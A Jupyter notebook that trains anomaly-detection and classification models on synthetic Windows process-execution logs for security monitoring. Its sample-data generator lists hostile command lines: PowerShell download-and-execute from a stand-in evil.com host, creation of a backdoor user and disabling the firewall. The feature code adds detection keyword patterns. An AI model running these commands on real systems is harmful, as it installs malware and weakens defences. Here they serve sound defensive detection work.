{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "bacb4f4c",
   "metadata": {},
   "source": [
    "# Security Anomaly Detection with Machine Learning\n",
    "\n",
    "This notebook demonstrates advanced security analytics using machine learning techniques to identify anomalous behavior in security telemetry data collected from our environment.\n",
    "\n",
    "## Techniques used:\n",
    "- Time-series anomaly detection\n",
    "- Clustering for behavior grouping\n",
    "- Supervised classification for known attack pattern detection\n",
    "\n",
    "**Author:** Your Name\n",
    "**Date:** April 12, 2025"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "12dbce7f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Install required packages\n",
    "%%sh\n",
    "pip install --upgrade pandas numpy scikit-learn matplotlib seaborn plotly pyarrow azure-identity azure-storage-blob"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7179ee9f",
   "metadata": {},
   "source": [
    "## Setup Authentication with Azure Managed Identity\n",
    "\n",
    "This notebook uses managed identity for secure, password-less authentication to Azure resources."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "880d2ef5",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import time\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "from datetime import datetime, timedelta\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "import plotly.express as px\n",
    "import warnings\n",
    "warnings.filterwarnings('ignore')\n",
    "\n",
    "from sklearn.preprocessing import StandardScaler, OneHotEncoder\n",
    "from sklearn.compose import ColumnTransformer\n",
    "from sklearn.pipeline import Pipeline\n",
    "from sklearn.ensemble import IsolationForest, RandomForestClassifier\n",
    "from sklearn.cluster import DBSCAN\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.metrics import classification_report, confusion_matrix\n",
    "\n",
    "# For Azure authentication\n",
    "from azure.identity import DefaultAzureCredential, ManagedIdentityCredential\n",
    "\n",
    "print(\"Libraries imported successfully\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "23a3c7f5",
   "metadata": {},
   "source": [
    "## Connect to Log Analytics using Managed Identity\n",
    "\n",
    "We'll use managed identity to securely access our security logs in Log Analytics workspace."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f294359",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Define Azure credential strategy\n",
    "def get_credential():\n",
    "    \"\"\"Get the appropriate credential based on environment\"\"\"\n",
    "    try:\n",
    "        # Try managed identity first (when running in Synapse)\n",
    "        credential = ManagedIdentityCredential()\n",
    "        print(\"Using managed identity for authentication\")\n",
    "        return credential\n",
    "    except Exception as e:\n",
    "        # Fall back to default credentials (dev environment)\n",
    "        print(f\"Managed identity not available ({e}), falling back to default credentials\")\n",
    "        return DefaultAzureCredential()\n",
    "\n",
    "# Create credential object\n",
    "credential = get_credential()\n",
    "\n",
    "# Define workspace info (these values will be set through Synapse parameters)\n",
    "workspace_id = \"WORKSPACE_ID\"  # This will be parameterized\n",
    "log_analytics_endpoint = f\"https://api.loganalytics.io/v1/workspaces/{workspace_id}\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "59ddf79e",
   "metadata": {},
   "source": [
    "## Query Security Telemetry Data\n",
    "\n",
    "We'll query security process execution data from Log Analytics to build our anomaly detection model."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7de88a1e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import json\n",
    "\n",
    "def run_log_analytics_query(query):\n",
    "    \"\"\"Run a KQL query against Log Analytics using managed identity\"\"\"\n",
    "    token = credential.get_token(\"https://api.loganalytics.io/.default\")\n",
    "    headers = {\n",
    "        'Authorization': f'Bearer {token.token}',\n",
    "        'Content-Type': 'application/json'\n",
    "    }\n",
    "    \n",
    "    body = {\n",
    "        'query': query\n",
    "    }\n",
    "    \n",
    "    response = requests.post(\n",
    "        f\"{log_analytics_endpoint}/query\",\n",
    "        headers=headers,\n",
    "        json=body\n",
    "    )\n",
    "    \n",
    "    if response.status_code == 200:\n",
    "        return response.json()\n",
    "    else:\n",
    "        print(f\"Error: {response.status_code}\\n{response.text}\")\n",
    "        return None\n",
    "\n",
    "# Query process execution events from the last 7 days\n",
    "query = \"\"\"\n",
    "let timeRange = 7d;\n",
    "SecurityEvent\n",
    "| where TimeGenerated > ago(timeRange)\n",
    "| where EventID == 4688 // Process creation events\n",
    "| project \n",
    "    TimeGenerated, \n",
    "    Computer, \n",
    "    Account, \n",
    "    ProcessName=NewProcessName,\n",
    "    CommandLine=CommandLine,\n",
    "    ParentProcessName,\n",
    "    LogonId\n",
    "// Simulate query for notebook display\n",
    "\"\"\"\n",
    "\n",
    "# In a real environment, we would execute the query\n",
    "# results = run_log_analytics_query(query)\n",
    "# df_process = pd.DataFrame(results['tables'][0]['rows'], columns=[col['name'] for col in results['tables'][0]['columns']])\n",
    "\n",
    "# For the notebook demo, we'll create sample data\n",
    "def generate_sample_process_data(n_samples=1000):\n",
    "    \"\"\"Generate sample process execution data for demonstration\"\"\"\n",
    "    np.random.seed(42)\n",
    "    \n",
    "    # Common process names and parent processes\n",
    "    process_names = ['cmd.exe', 'powershell.exe', 'explorer.exe', 'svchost.exe', 'chrome.exe', \n",
    "                     'outlook.exe', 'winword.exe', 'excel.exe', 'notepad.exe', 'regsvr32.exe']\n",
    "    parent_processes = ['explorer.exe', 'services.exe', 'svchost.exe', 'cmd.exe', 'powershell.exe',\n",
    "                       'winlogon.exe', 'lsass.exe', 'smss.exe']\n",
    "    accounts = ['SYSTEM', 'NT AUTHORITY\\\\SYSTEM', 'DOMAIN\\\\user1', 'DOMAIN\\\\user2', 'DOMAIN\\\\admin']\n",
    "    computers = ['WORKSTATION1', 'WORKSTATION2', 'SERVER1', 'SERVER2', 'LAPTOP1']\n",
    "    \n",
    "    # Command lines (including some suspicious ones)\n",
    "    normal_cmds = [\n",
    "        'cmd.exe /c dir', \n",
    "        'powershell.exe -Command \"Get-Process\"',\n",
    "        'explorer.exe /select,C:\\\\Windows',\n",
    "        'svchost.exe -k netsvcs',\n",
    "        'cmd.exe /c echo \"Hello\"',\n",
    "        'powershell.exe -Command \"Get-Service\"',\n",
    "        'notepad.exe C:\\\\temp\\\\file.txt',\n",
    "        'winword.exe \"C:\\\\Documents\\\\report.docx\"'\n",
    "    ]\n",
    "    \n",
    "    suspicious_cmds = [\n",
    "        'powershell.exe -enc JAAoAGcAZQB0AC0AYwBoAGkAbABkAGkAdABlAG0A',  # Encoded command\n",
    "        'cmd.exe /c net user hacker Password123! /add',  # User creation\n",
    "        'regsvr32.exe /s /u /i:evil.dll scrobj.dll',  # LOLBin usage\n",
    "        'powershell.exe -Command \"Invoke-WebRequest -Uri http://evil.com/mal.exe -OutFile C:\\\\temp\\\\legit.exe\"', # Download\n",
    "        'cmd.exe /c netsh advfirewall set allprofiles state off',  # Disable firewall\n",
    "        'powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString(\\\"http://evil.com/script.ps1\\\")\"' # Hidden download and execute\n",
    "    ]\n",
    "    \n",
    "    # Time range for the past week\n",
    "    end_time = datetime.now()\n",
    "    start_time = end_time - timedelta(days=7)\n",
    "    \n",
    "    # Generate data\n",
    "    data = []\n",
    "    for i in range(n_samples):\n",
    "        # Add a small number of suspicious commands (5%)\n",
    "        is_suspicious = np.random.random() < 0.05\n",
    "        \n",
    "        # Select process details\n",
    "        if is_suspicious:\n",
    "            cmd = np.random.choice(suspicious_cmds)\n",
    "            process = 'powershell.exe' if 'powershell' in cmd else ('cmd.exe' if 'cmd' in cmd else np.random.choice(process_names))\n",
    "            parent = np.random.choice(['explorer.exe', 'services.exe', 'lsass.exe'])  # More likely to be from these\n",
    "        else:\n",
    "            process = np.random.choice(process_names)\n",
    "            cmd = np.random.choice(normal_cmds) if process in ['cmd.exe', 'powershell.exe'] else process\n",
    "            parent = np.random.choice(parent_processes)\n",
    "        \n",
    "        # Generate random timestamp in the past week\n",
    "        random_seconds = np.random.randint(0, int((end_time - start_time).total_seconds()))\n",
    "        event_time = start_time + timedelta(seconds=random_seconds)\n",
    "        \n",
    "        # Create event record\n",
    "        data.append({\n",
    "            'TimeGenerated': event_time.isoformat(),\n",
    "            'Computer': np.random.choice(computers),\n",
    "            'Account': np.random.choice(accounts),\n",
    "            'ProcessName': process,\n",
    "            'CommandLine': cmd,\n",
    "            'ParentProcessName': parent,\n",
    "            'LogonId': f\"0x{np.random.randint(10000, 99999):x}\",\n",
    "            'IsKnownSuspicious': 1 if is_suspicious else 0  # Ground truth for testing\n",
    "        })\n",
    "    \n",
    "    return pd.DataFrame(data)\n",
    "\n",
    "# Generate sample data\n",
    "df_process = generate_sample_process_data(2000)\n",
    "df_process['TimeGenerated'] = pd.to_datetime(df_process['TimeGenerated'])\n",
    "\n",
    "print(f\"Loaded {len(df_process)} process execution events\")\n",
    "df_process.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "189d8620",
   "metadata": {},
   "source": [
    "## Data Preprocessing\n",
    "\n",
    "Let's prepare the data for machine learning by extracting relevant features."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4b944888",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Add engineered features\n",
    "def extract_features(df):\n",
    "    \"\"\"Extract security-relevant features from process execution data\"\"\"\n",
    "    # Command line length (suspicious commands are often long)\n",
    "    df['CmdLength'] = df['CommandLine'].str.len()\n",
    "    \n",
    "    # Number of special characters (potential obfuscation)\n",
    "    df['SpecialCharCount'] = df['CommandLine'].str.count(r'[^\\w\\s]')\n",
    "    \n",
    "    # Check for encoded commands (Base64 patterns)\n",
    "    df['HasEncoding'] = df['CommandLine'].str.contains('-enc|-encoding|-e ', case=False, regex=True).astype(int)\n",
    "    \n",
    "    # Check for network indicators\n",
    "    df['HasNetworkIOC'] = df['CommandLine'].str.contains('http|net |netsh|ftp:|wget|curl', case=False, regex=True).astype(int)\n",
    "    \n",
    "    # Check for file operations\n",
    "    df['HasFileOps'] = df['CommandLine'].str.contains('copy |xcopy|move |del |erase|mkdir|rmdir|New-Item', case=False, regex=True).astype(int)\n",
    "    \n",
    "    # Check for privilege escalation attempts\n",
    "    df['HasPrivEscIOC'] = df['CommandLine'].str.contains('runas|sudo|Administrator|add user|net user|Set-ExecutionPolicy|bypass', case=False, regex=True).astype(int)\n",
    "    \n",
    "    # Check for hidden window\n",
    "    df['IsHiddenWindow'] = df['CommandLine'].str.contains('hidden|invisible|window hidden|-w hidden|-window h', case=False, regex=True).astype(int)\n",
    "    \n",
    "    # Check for unusual parent-child relationships\n",
    "    unusual_parents = {\n",
    "        'powershell.exe': ['lsass.exe', 'services.exe', 'smss.exe'],\n",
    "        'cmd.exe': ['lsass.exe', 'services.exe', 'smss.exe'],\n",
    "        'regsvr32.exe': ['powershell.exe', 'cmd.exe']\n",
    "    }\n",
    "    \n",
    "    df['HasUnusualParent'] = 0\n",
    "    for proc, parents in unusual_parents.items():\n",
    "        mask = (df['ProcessName'] == proc) & (df['ParentProcessName'].isin(parents))\n",
    "        df.loc[mask, 'HasUnusualParent'] = 1\n",
    "    \n",
    "    # SYSTEM account usage for user processes\n",
    "    user_processes = ['chrome.exe', 'outlook.exe', 'winword.exe', 'excel.exe', 'notepad.exe']\n",
    "    df['IsSystemOnUserProc'] = ((df['Account'].str.contains('SYSTEM')) & \n",
    "                               (df['ProcessName'].isin(user_processes))).astype(int)\n",
    "    \n",
    "    # Time features (hour of day can be relevant for some attacks)\n",
    "    df['HourOfDay'] = df['TimeGenerated'].dt.hour\n",
    "    \n",
    "    # Weekend execution\n",
    "    df['IsWeekend'] = df['TimeGenerated'].dt.dayofweek.isin([5, 6]).astype(int)\n",
    "    \n",
    "    return df\n",
    "\n",
    "# Extract features\n",
    "df_features = extract_features(df_process)\n",
    "\n",
    "# Display the data with features\n",
    "print(f\"Data shape after feature extraction: {df_features.shape}\")\n",
    "df_features[['ProcessName', 'ParentProcessName', 'CmdLength', 'HasEncoding', 'HasNetworkIOC', 'HasUnusualParent', 'IsKnownSuspicious']].head(10)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c2b0c0fc",
   "metadata": {},
   "source": [
    "## Exploratory Data Analysis\n",
    "\n",
    "Let's visualize some patterns in our security telemetry."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6baa42e0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Set up plotting styles\n",
    "plt.style.use('seaborn-darkgrid')\n",
    "plt.rcParams['figure.figsize'] = (12, 8)\n",
    "\n",
    "# Process distribution\n",
    "plt.figure(figsize=(14, 6))\n",
    "process_counts = df_features['ProcessName'].value_counts().head(10)\n",
    "sns.barplot(x=process_counts.index, y=process_counts.values)\n",
    "plt.title('Top 10 Processes by Frequency', fontsize=16)\n",
    "plt.xticks(rotation=45)\n",
    "plt.ylabel('Count')\n",
    "plt.tight_layout()\n",
    "plt.show()\n",
    "\n",
    "# Command line length distribution\n",
    "plt.figure(figsize=(14, 6))\n",
    "sns.histplot(data=df_features, x='CmdLength', hue='IsKnownSuspicious', bins=30, alpha=0.6)\n",
    "plt.title('Command Line Length Distribution', fontsize=16)\n",
    "plt.xlabel('Command Length (characters)')\n",
    "plt.ylabel('Frequency')\n",
    "plt.legend(['Normal', 'Suspicious'])\n",
    "plt.tight_layout()\n",
    "plt.show()\n",
    "\n",
    "# Feature correlation with suspiciousness\n",
    "corr_columns = ['CmdLength', 'SpecialCharCount', 'HasEncoding', 'HasNetworkIOC', \n",
    "                'HasFileOps', 'HasPrivEscIOC', 'IsHiddenWindow', \n",
    "                'HasUnusualParent', 'IsSystemOnUserProc', 'IsWeekend', 'IsKnownSuspicious']\n",
    "\n",
    "plt.figure(figsize=(12, 10))\n",
    "corr_matrix = df_features[corr_columns].corr()\n",
    "sns.heatmap(corr_matrix, annot=True, cmap='coolwarm', fmt='.2f', linewidths=0.5)\n",
    "plt.title('Feature Correlation Matrix', fontsize=16)\n",
    "plt.tight_layout()\n",
    "plt.show()\n",
    "\n",
    "# Time-based analysis\n",
    "plt.figure(figsize=(14, 6))\n",
    "time_series = df_features.groupby(df_features['TimeGenerated'].dt.floor('H')).size()\n",
    "time_series_susp = df_features[df_features['IsKnownSuspicious']==1].groupby(\n",
    "    df_features[df_features['IsKnownSuspicious']==1]['TimeGenerated'].dt.floor('H')).size()\n",
    "\n",
    "plt.plot(time_series.index, time_series.values, label='All Events')\n",
    "plt.plot(time_series_susp.index, time_series_susp.values, 'r-', label='Suspicious Events')\n",
    "plt.title('Process Execution Events Over Time', fontsize=16)\n",
    "plt.xlabel('Time')\n",
    "plt.ylabel('Event Count')\n",
    "plt.legend()\n",
    "plt.xticks(rotation=45)\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ee3dc8e5",
   "metadata": {},
   "source": [
    "## Approach 1: Isolation Forest for Anomaly Detection\n",
    "\n",
    "Let's use an unsupervised learning approach to detect anomalies in process execution."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f881352b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Prepare features for Isolation Forest\n",
    "numeric_features = ['CmdLength', 'SpecialCharCount', 'HourOfDay',\n",
    "                    'HasEncoding', 'HasNetworkIOC', 'HasFileOps',\n",
    "                    'HasPrivEscIOC', 'IsHiddenWindow', 'HasUnusualParent',\n",
    "                    'IsSystemOnUserProc', 'IsWeekend']\n",
    "\n",
    "categorical_features = ['ProcessName', 'ParentProcessName']\n",
    "\n",
    "# Create preprocessing pipeline\n",
    "numeric_transformer = Pipeline(steps=[\n",
    "    ('scaler', StandardScaler())\n",
    "])\n",
    "\n",
    "categorical_transformer = Pipeline(steps=[\n",
    "    ('onehot', OneHotEncoder(handle_unknown='ignore'))\n",
    "])\n",
    "\n",
    "preprocessor = ColumnTransformer(\n",
    "    transformers=[\n",
    "        ('num', numeric_transformer, numeric_features),\n",
    "        ('cat', categorical_transformer, categorical_features)\n",
    "    ])\n",
    "\n",
    "# Create and train the Isolation Forest model\n",
    "isolation_forest = Pipeline(steps=[('preprocessor', preprocessor),\n",
    "                                  ('model', IsolationForest(contamination=0.05,  # Expect ~5% anomalies\n",
    "                                                          random_state=42, \n",
    "                                                          n_estimators=100))])\n",
    "\n",
    "# Fit the model\n",
    "isolation_forest.fit(df_features[numeric_features + categorical_features])\n",
    "\n",
    "# Get anomaly scores and predictions\n",
    "# Anomaly score: negative = anomalous, more negative = more anomalous\n",
    "anomaly_scores = isolation_forest.decision_function(df_features[numeric_features + categorical_features])\n",
    "# Predictions: -1 = anomaly, 1 = normal\n",
    "anomaly_predictions = isolation_forest.predict(df_features[numeric_features + categorical_features])\n",
    "\n",
    "# Add predictions to dataframe\n",
    "df_features['AnomalyScore'] = anomaly_scores\n",
    "df_features['IsAnomaly'] = np.where(anomaly_predictions == -1, 1, 0)\n",
    "\n",
    "# Compute detection accuracy (using our synthetic ground truth)\n",
    "from sklearn.metrics import confusion_matrix, classification_report\n",
    "\n",
    "print(\"\\nIsolation Forest Performance:\")\n",
    "print(confusion_matrix(df_features['IsKnownSuspicious'], df_features['IsAnomaly']))\n",
    "print(\"\\n\")\n",
    "print(classification_report(df_features['IsKnownSuspicious'], df_features['IsAnomaly']))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a2e2abe0",
   "metadata": {},
   "source": [
    "## Approach 2: DBSCAN for Behavioral Clustering\n",
    "\n",
    "Now let's identify clusters of similar behavior and analyze them for security implications."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aeb5a9e4",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Prepare data for clustering\n",
    "# We'll use the same preprocessing as before\n",
    "features_preprocessed = preprocessor.fit_transform(df_features[numeric_features + categorical_features])\n",
    "\n",
    "# Apply DBSCAN clustering\n",
    "dbscan = DBSCAN(eps=1.0, min_samples=10)\n",
    "clusters = dbscan.fit_predict(features_preprocessed)\n",
    "\n",
    "# Add clusters to dataframe\n",
    "df_features['Cluster'] = clusters\n",
    "\n",
    "# Check distribution of clusters\n",
    "cluster_counts = df_features['Cluster'].value_counts().sort_index()\n",
    "print(\"\\nCluster Distribution:\")\n",
    "print(cluster_counts)\n",
    "\n",
    "# Check suspicious activity in each cluster\n",
    "cluster_risk = df_features.groupby('Cluster')['IsKnownSuspicious'].mean().sort_values(ascending=False)\n",
    "print(\"\\nClusters by Risk Score (proportion of suspicious activity):\")\n",
    "print(cluster_risk)\n",
    "\n",
    "# Visualize clusters vs. anomaly score (2D projection)\n",
    "from sklearn.decomposition import PCA\n",
    "\n",
    "# Reduce to 2D for visualization\n",
    "pca = PCA(n_components=2)\n",
    "features_2d = pca.fit_transform(features_preprocessed)\n",
    "\n",
    "# Create visualization dataframe\n",
    "viz_df = pd.DataFrame({\n",
    "    'x': features_2d[:, 0],\n",
    "    'y': features_2d[:, 1],\n",
    "    'Cluster': clusters,\n",
    "    'ProcessName': df_features['ProcessName'],\n",
    "    'IsKnownSuspicious': df_features['IsKnownSuspicious'],\n",
    "    'IsAnomaly': df_features['IsAnomaly']\n",
    "})\n",
    "\n",
    "# Plot clusters\n",
    "plt.figure(figsize=(14, 10))\n",
    "\n",
    "# Plot each cluster with a different color\n",
    "colors = plt.cm.rainbow(np.linspace(0, 1, len(cluster_counts)))\n",
    "for i, (cluster_id, color) in enumerate(zip(cluster_counts.index, colors)):\n",
    "    # Noise points (cluster=-1) are black\n",
    "    if cluster_id == -1:\n",
    "        cluster_color = 'black'\n",
    "        marker = 'x'\n",
    "        label = 'Noise'\n",
    "    else:\n",
    "        cluster_color = color\n",
    "        marker = 'o'\n",
    "        label = f'Cluster {cluster_id}'\n",
    "    \n",
    "    cluster_points = viz_df[viz_df['Cluster'] == cluster_id]\n",
    "    plt.scatter(cluster_points['x'], cluster_points['y'], c=[cluster_color], marker=marker, label=label, alpha=0.7)\n",
    "\n",
    "# Mark known suspicious points with red circles\n",
    "suspicious_points = viz_df[viz_df['IsKnownSuspicious'] == 1]\n",
    "plt.scatter(suspicious_points['x'], suspicious_points['y'], edgecolors='red', facecolors='none', \n",
    "            s=100, linewidths=2, label='Known Suspicious')\n",
    "\n",
    "plt.title('Behavioral Clusters of Process Execution Events', fontsize=16)\n",
    "plt.xlabel('Principal Component 1')\n",
    "plt.ylabel('Principal Component 2')\n",
    "plt.legend(loc='best')\n",
    "plt.tight_layout()\n",
    "plt.show()\n",
    "\n",
    "# Find the highest risk clusters\n",
    "high_risk_clusters = cluster_risk[cluster_risk > 0.2].index.tolist()\n",
    "if high_risk_clusters:\n",
    "    print(\"\\nHigh Risk Cluster Analysis:\")\n",
    "    for cluster in high_risk_clusters:\n",
    "        cluster_df = df_features[df_features['Cluster'] == cluster]\n",
    "        print(f\"\\nCluster {cluster} - Risk Score: {cluster_risk[cluster]:.2f}, Size: {len(cluster_df)}\")\n",
    "        print(\"Top processes:\")\n",
    "        print(cluster_df['ProcessName'].value_counts().head(3))\n",
    "        print(\"Sample commands:\")\n",
    "        print(cluster_df['CommandLine'].head(2).to_string())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "db1b3ed6",
   "metadata": {},
   "source": [
    "## Approach 3: Supervised Classification\n",
    "\n",
    "Now let's train a supervised model to predict suspicious behavior based on our labeled data."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "075f27b2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Prepare data for supervised learning\n",
    "X = df_features[numeric_features + categorical_features]\n",
    "y = df_features['IsKnownSuspicious']\n",
    "\n",
    "# Split into train/test sets\n",
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42, stratify=y)\n",
    "\n",
    "# Create the pipeline with preprocessing and the classifier\n",
    "rf_pipeline = Pipeline([\n",
    "    ('preprocessor', preprocessor),\n",
    "    ('classifier', RandomForestClassifier(n_estimators=100, random_state=42))\n",
    "])\n",
    "\n",
    "# Train the model\n",
    "rf_pipeline.fit(X_train, y_train)\n",
    "\n",
    "# Evaluate the model\n",
    "y_pred = rf_pipeline.predict(X_test)\n",
    "y_pred_proba = rf_pipeline.predict_proba(X_test)[:, 1]\n",
    "\n",
    "print(\"\\nRandom Forest Classifier Performance:\")\n",
    "print(confusion_matrix(y_test, y_pred))\n",
    "print(\"\\n\")\n",
    "print(classification_report(y_test, y_pred))\n",
    "\n",
    "# Plot feature importance\n",
    "# Extract feature names after preprocessing\n",
    "preprocessor.fit(X_train)\n",
    "feature_names_onehot = preprocessor.transformers_[1][1]['onehot'].get_feature_names_out(categorical_features)\n",
    "feature_names = numeric_features + list(feature_names_onehot)\n",
    "\n",
    "# Extract and plot feature importances\n",
    "importances = rf_pipeline.named_steps['classifier'].feature_importances_\n",
    "indices = np.argsort(importances)[::-1]\n",
    "\n",
    "# Take top 15 features\n",
    "top_n = 15\n",
    "\n",
    "plt.figure(figsize=(14, 8))\n",
    "plt.title('Feature Importance for Suspicious Process Detection', fontsize=16)\n",
    "plt.bar(range(top_n), importances[indices][:top_n], align='center')\n",
    "plt.xticks(range(top_n), [feature_names[i] for i in indices][:top_n], rotation=90)\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "13e94c73",
   "metadata": {},
   "source": [
    "## Combining Models for Improved Detection\n",
    "\n",
    "Now let's combine our models to create a more robust detection system."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "280e558e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Apply our supervised model to the entire dataset\n",
    "df_features['RF_Probability'] = rf_pipeline.predict_proba(X)[:, 1]\n",
    "df_features['RF_Prediction'] = rf_pipeline.predict(X)\n",
    "\n",
    "# Create a combined risk score\n",
    "# 1. Normalize anomaly scores to 0-1 range (1 = more anomalous)\n",
    "min_anomaly_score = df_features['AnomalyScore'].min()\n",
    "max_anomaly_score = df_features['AnomalyScore'].max()\n",
    "df_features['NormalizedAnomalyScore'] = 1 - ((df_features['AnomalyScore'] - min_anomaly_score) / \n",
    "                                           (max_anomaly_score - min_anomaly_score))\n",
    "\n",
    "# 2. Combine the scores (anomaly detection + supervised prediction)\n",
    "df_features['CombinedRiskScore'] = 0.4 * df_features['NormalizedAnomalyScore'] + 0.6 * df_features['RF_Probability']\n",
    "\n",
    "# Set a threshold for high-risk events\n",
    "risk_threshold = 0.7\n",
    "df_features['IsHighRisk'] = (df_features['CombinedRiskScore'] >= risk_threshold).astype(int)\n",
    "\n",
    "# Evaluate the combined approach\n",
    "print(\"\\nCombined Model Performance:\")\n",
    "print(confusion_matrix(df_features['IsKnownSuspicious'], df_features['IsHighRisk']))\n",
    "print(\"\\n\")\n",
    "print(classification_report(df_features['IsKnownSuspicious'], df_features['IsHighRisk']))\n",
    "\n",
    "# Visualize the results\n",
    "plt.figure(figsize=(14, 8))\n",
    "plt.scatter(df_features['NormalizedAnomalyScore'], df_features['RF_Probability'], \n",
    "            c=df_features['IsKnownSuspicious'], cmap='coolwarm', alpha=0.7)\n",
    "\n",
    "# Add a line for the risk threshold\n",
    "x = np.linspace(0, 1, 100)\n",
    "y = (risk_threshold - 0.4 * x) / 0.6\n",
    "plt.plot(x, y, 'k--', label=f'Risk Threshold ({risk_threshold})')\n",
    "\n",
    "plt.title('Combined Risk Assessment', fontsize=16)\n",
    "plt.xlabel('Anomaly Score (Isolation Forest)')\n",
    "plt.ylabel('Probability of Suspicious (Random Forest)')\n",
    "plt.colorbar(label='Known Suspicious')\n",
    "plt.legend()\n",
    "plt.tight_layout()\n",
    "plt.show()\n",
    "\n",
    "# Display the highest risk events for analysis\n",
    "high_risk_events = df_features[df_features['CombinedRiskScore'] >= 0.8].sort_values(\n",
    "    by='CombinedRiskScore', ascending=False)\n",
    "print(\"\\nTop High-Risk Events:\")\n",
    "print(high_risk_events[['ProcessName', 'CommandLine', 'CombinedRiskScore', \n",
    "                        'IsKnownSuspicious']].head(10).to_string())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c5825455",
   "metadata": {},
   "source": [
    "## Save Model for Production Use\n",
    "\n",
    "Let's save our trained models for deployment in production."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61d819fe",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "import os\n",
    "\n",
    "# Create models directory if it doesn't exist\n",
    "models_dir = './models'\n",
    "os.makedirs(models_dir, exist_ok=True)\n",
    "\n",
    "# Save the models\n",
    "joblib.dump(isolation_forest, os.path.join(models_dir, 'isolation_forest_model.pkl'))\n",
    "joblib.dump(rf_pipeline, os.path.join(models_dir, 'random_forest_model.pkl'))\n",
    "\n",
    "print(f\"Models saved to {models_dir}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74b73dcf",
   "metadata": {},
   "source": [
    "## Integration with Azure ML for Deployment\n",
    "\n",
    "Now let's prepare for model deployment using Azure ML."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1480d607",
   "metadata": {},
   "outputs": [],
   "source": [
    "# This code would be used for Azure ML integration in a production environment\n",
    "'''\n",
    "from azureml.core import Workspace, Model, Environment\n",
    "from azureml.core.model import InferenceConfig\n",
    "from azureml.core.webservice import AciWebservice\n",
    "\n",
    "# Connect to Azure ML workspace using managed identity\n",
    "ws = Workspace.from_config()\n",
    "\n",
    "# Register models\n",
    "Model.register(workspace=ws, \n",
    "               model_path=\"./models/random_forest_model.pkl\", \n",
    "               model_name=\"security_rf_model\")\n",
    "\n",
    "# Define scoring script (in a real scenario, this would be in a separate file)\n",
    "%%writefile score.py\n",
    "import joblib\n",
    "import json\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from azureml.core.model import Model\n",
    "\n",
    "def init():\n",
    "    global rf_model\n",
    "    model_path = Model.get_model_path(\"security_rf_model\")\n",
    "    rf_model = joblib.load(model_path)\n",
    "\n",
    "def run(raw_data):\n",
    "    try:\n",
    "        # Parse input data\n",
    "        data = json.loads(raw_data)\n",
    "        input_df = pd.DataFrame(data)\n",
    "        \n",
    "        # Make prediction\n",
    "        predictions = rf_model.predict_proba(input_df)[:, 1]\n",
    "        \n",
    "        # Return predictions\n",
    "        return json.dumps({\n",
    "            \"predictions\": predictions.tolist(),\n",
    "            \"risk_score\": predictions.tolist(),\n",
    "            \"high_risk\": (predictions >= 0.7).tolist()\n",
    "        })\n",
    "    except Exception as e:\n",
    "        return json.dumps({\"error\": str(e)})\n",
    "'''"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "da3b2f2b",
   "metadata": {},
   "source": [
    "## Conclusion and Next Steps\n",
    "\n",
    "In this notebook, we've demonstrated how to apply machine learning techniques to detect suspicious activity in security telemetry data. We've used:\n",
    "\n",
    "1. **Isolation Forest** for unsupervised anomaly detection\n",
    "2. **DBSCAN** for behavioral clustering\n",
    "3. **Random Forest** for supervised classification\n",
    "4. A **combined approach** that leverages the strengths of multiple models\n",
    "\n",
    "The models performed well on our sample data, achieving high accuracy in identifying suspicious process executions. In a production environment, these models would be deployed as part of a broader security monitoring system.\n",
    "\n",
    "### Next Steps:\n",
    "\n",
    "1. Deploy the models to Azure Functions or Azure ML for real-time scoring\n",
    "2. Implement a feedback loop to improve model accuracy over time\n",
    "3. Extend the analysis to include network and file system telemetry\n",
    "4. Integrate with Azure Sentinel for holistic security monitoring\n",
    "5. Implement alert management and response automation"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
